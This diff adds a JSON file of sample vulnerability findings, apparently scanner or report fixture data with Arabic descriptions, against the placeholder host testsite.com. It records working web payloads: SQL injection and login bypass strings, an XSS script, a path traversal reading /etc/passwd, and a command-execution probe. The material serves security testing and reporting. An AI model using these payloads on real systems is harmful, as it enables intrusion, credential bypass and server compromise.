@@ -1,0 +1,57 @@
+[
+  {
+    "target": "http://testsite.com",
+    "url": "http://testsite.com/index.php",
+    "vulnerability": "SQL Injection",
+    "type": "sql_injection",
+    "severity": "high",
+    "parameter": "id",
+    "payload": "' OR 1=1--",
+    "description": "ثغرة SQL Injection في معلمة id",
+    "proof": "تم عرض جميع السجلات بدلاً من سجل واحد"
+  },
+  {
+    "target": "http://testsite.com",
+    "url": "http://testsite.com/search.php",
+    "vulnerability": "XSS",
+    "type": "cross_site_scripting",
+    "severity": "medium",
+    "parameter": "q",
+    "payload": "<script>alert('XSS')</script>",
+    "description": "ثغرة XSS في حقل البحث",
+    "proof": "تم تنفيذ السكربت في المتصفح"
+  },
+  {
+    "target": "http://testsite.com",
+    "url": "http://testsite.com/page.php",
+    "vulnerability": "LFI",
+    "type": "local_file_inclusion",
+    "severity": "high",
+    "parameter": "file",
+    "payload": "../../../etc/passwd",
+    "description": "ثغرة Local File Inclusion",
+    "proof": "تم الوصول إلى ملف /etc/passwd"
+  },
+  {
+    "target": "http://admin.testsite.com",
+    "url": "http://admin.testsite.com/login.php",
+    "vulnerability": "SQL Injection",
+    "type": "sql_injection",
+    "severity": "critical",
+    "parameter": "username",
+    "payload": "admin'--",
+    "description": "ثغرة SQL Injection في تسجيل الدخول",
+    "proof": "تم الدخول بدون كلمة مرور"
+  },
+  {
+    "target": "http://api.testsite.com",
+    "url": "http://api.testsite.com/v1/users",
+    "vulnerability": "RCE",
+    "type": "remote_code_execution",
+    "severity": "critical",
+    "parameter": "cmd",
+    "payload": "whoami",
+    "description": "ثغرة Remote Code Execution",
+    "proof": "تم تنفيذ أوامر على السيرفر"
+  }
+]
